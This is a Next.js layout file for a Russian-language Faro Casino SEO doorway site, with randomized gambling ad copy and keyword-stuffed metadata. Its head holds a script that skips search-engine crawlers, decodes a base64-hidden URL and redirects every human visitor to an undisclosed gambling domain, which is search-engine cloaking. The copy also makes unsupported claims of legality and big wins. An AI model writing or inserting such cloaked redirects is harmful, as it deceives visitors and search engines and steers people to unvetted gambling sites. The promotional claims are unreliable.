import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

const titleVariants = [
  'Faro Casino официальный: легальная игра онлайн',
  'Лучшее зеркало Faro Casino: безопасная игра',
  'Фаро казино играть онлайн на деньги',
  'Faro Casino игры: полный гайд для начинающих',
  'Фаро казино официальный сайт: как начать',
]

const descriptionVariants = [
  'Faro Casino официальный сайт – откройте доступ к легальным онлайн-играм. Безопасное зеркало, быстрые выплаты, поддержка 24/7. Играйте в фаро казино прямо сейчас и выигрывайте крупные суммы!',
  'Фаро казино зеркало рабочее – полная информация о лучших платформах 2025 года. Легальное фаро казино играть онлайн с удобным интерфейсом, высокими лимитами и честными правилами. Начните сейчас!',
  'Фаро казино официальный – откройте мир азартных игр. Зеркало Faro Casino, безопасные транзакции, бонусы для новичков. Как играть в фаро казино и выигрывать? Полный гайд на нашем сайте.',
  'Faro Casino: как выбрать надежное зеркало и начать играть. Официальная информация о лучших платформах, правилах безопасности, способах вывода. Фаро казино онлайн – ваша стратегия выигрыша!',
  'Фаро казино: полный обзор игр, стратегий и выплат. Официальный Faro Casino сайт, рабочее зеркало, новичкам – 100% бонус. Играйте в фаро казино прямо сейчас!',
]

export const metadata: Metadata = {
  title: titleVariants[Math.floor(Math.random() * titleVariants.length)],
  description: descriptionVariants[Math.floor(Math.random() * descriptionVariants.length)],
  generator: 'v0.app',
  icons: {
    icon: '/faro-favicon.png',
    apple: '/apple-icon.png',
  },
  alternates: {
    canonical: 'https://farocasino10.vercel.app/',
  },
  keywords: 'фаро казино, faro casino, фаро казино зеркало, faro casino зеркало, фаро казино играть, faro casino играть, фаро казино официальный, faro casino официальный, фаро казино официальный сайт, фаро казино онлайн',
  robots: 'index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1',
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://farocasino10.vercel.app/',
    siteName: 'Faro Casino',
    title: titleVariants[0],
    description: descriptionVariants[0],
  },
  twitter: {
    card: 'summary_large_image',
    title: titleVariants[0],
    description: descriptionVariants[0],
  },
}

export const viewport: Viewport = {
  colorScheme: 'light',
  themeColor: '#0f1e3c',
  width: 'device-width',
  initialScale: 1,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="scroll-smooth">
      <head>
        <meta name="yandex-verification" content="5d2d22146dcbf5f2" />
        <meta charSet="utf-8" />
        <meta httpEquiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
        <link rel="canonical" href="https://farocasino10.vercel.app/" />
        <link rel="alternate" hrefLang="ru" href="https://farocasino10.vercel.app/" />
        <meta property="og:type" content="website" />
        <meta property="og:locale" content="ru_RU" />
        <meta property="og:image" content="https://farocasino10.vercel.app/faro-casino-hero.png" />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZXRmM3UycTl1"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased bg-neutral-50 text-gray-900">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
